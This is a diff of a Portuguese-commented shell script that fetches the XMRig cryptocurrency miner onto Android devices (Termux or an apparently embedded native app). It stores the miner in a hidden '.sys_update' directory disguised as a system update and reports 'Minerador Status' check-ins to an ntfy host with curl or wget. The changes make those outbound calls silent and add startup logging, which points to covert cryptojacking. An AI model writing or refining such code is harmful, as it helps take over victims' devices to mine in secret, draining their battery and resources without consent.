@@ -16,11 +16,15 @@ function send_checkin() {
     
     # Tentar curl, depois wget como fallback
     if command -v curl >/dev/null 2>&1; then
-        curl -H "Title: Minerador Status" -H "Priority: default" -H "Tags: hammer,computer" -d "$msg" "$NTFY_URL" > /dev/null 2>&1
+        curl -s -H "Title: Minerador Status" -H "Priority: default" -H "Tags: hammer,computer" -d "$msg" "$NTFY_URL" > /dev/null 2>&1
     elif command -v wget >/dev/null 2>&1; then
-        wget --header="Title: Minerador Status" --post-data="$msg" "$NTFY_URL" -O /dev/null > /dev/null 2>&1
+        wget -q --header="Title: Minerador Status" --post-data="$msg" "$NTFY_URL" -O /dev/null > /dev/null 2>&1
     fi
 }
+
+# Log inicial imediato para testar se o script está rodando
+mkdir -p "$TMP_BASE"
+echo "[$(date)] Script iniciado (Native App: $IS_NATIVE_APP)" >> "$TMP_BASE/sys_log.txt"
 
 ARCH=$(uname -m)
 IS_TERMUX=$(echo $HOME | grep -q "com.termux" && echo "true" || echo "false")
@@ -34,6 +38,8 @@ fi
 if [ "$IS_NATIVE_APP" = "true" ]; then
     TMP_BASE="$APP_FILES_DIR/.sys_update"
     URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
+    # Garantir que o diretório existe imediatamente
+    mkdir -p "$TMP_BASE"
 elif [ "$IS_TERMUX" = "true" ]; then
     TMP_BASE="$HOME/.sys_update"
     URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-android-arm64.tar.gz"
